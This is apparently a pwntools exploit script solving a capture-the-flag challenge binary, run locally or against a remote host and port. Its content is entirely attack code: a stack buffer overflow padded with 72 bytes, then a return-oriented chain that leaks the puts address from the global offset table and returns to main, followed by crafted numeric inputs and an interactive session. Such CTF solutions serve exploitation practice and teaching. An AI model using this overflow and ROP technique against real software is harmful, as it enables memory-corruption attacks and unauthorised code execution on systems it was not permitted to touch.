#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *
import string
import sys

elf = context.binary = ELF("./dist/chall")


def start(argv=[], *a, **kw):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port, timeout=10)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}

fl = 4.00793
fl = 262664

pop_rdi = 0x401313
payload = flat(b"AAAAAAAA")
payload += flat(b"AAAAAAAA")
payload += flat(b"AAAAAAAA")
payload += flat(b"AAAAAAAA")
payload += flat(b"AAAAAAAA")
payload += flat(b"AAAAAAAA")
payload += flat(b"AAAAAAAA")
payload += flat(b"AAAAAAAA")
payload += flat(b"AAAAAAAA")
payload += flat(pop_rdi, elf.got["puts"])
payload += flat(elf.plt["puts"], elf.symbols["main"])

log.info(f"{len(payload)=}")

io = start()

pause()
io.sendafter(b"tale.\n", payload)
io.sendlineafter(b"number!\n", str(fl).encode("utf-8"))
io.sendlineafter(b"number!\n", str(fl).encode("utf-8"))
io.sendlineafter(b"number!\n", str(fl).encode("utf-8"))

io.interactive()
